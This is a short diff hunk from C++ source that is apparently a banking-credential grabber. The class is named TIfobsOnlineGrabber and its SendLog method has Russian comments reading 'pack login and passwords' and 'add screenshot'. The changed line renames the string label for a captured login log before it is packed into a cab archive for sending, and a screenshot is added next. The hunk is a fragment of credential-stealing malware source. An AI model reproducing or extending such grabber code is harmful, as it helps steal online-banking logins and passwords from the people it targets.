@@ -307,7 +307,7 @@ BOOL TIfobsOnlineGrabber::SendLog()
 	if (Cab)
 	{
 		// Упаковываем логин и пароли
-		AddStringToCab(Cab, Log, GetStr(StrLogFileInformation));
+		AddStringToCab(Cab, Log, GetStr(StrLogFileTextData));
 
 		// Добавляем скриншот
 		string Screen = File::GetTempName2A();
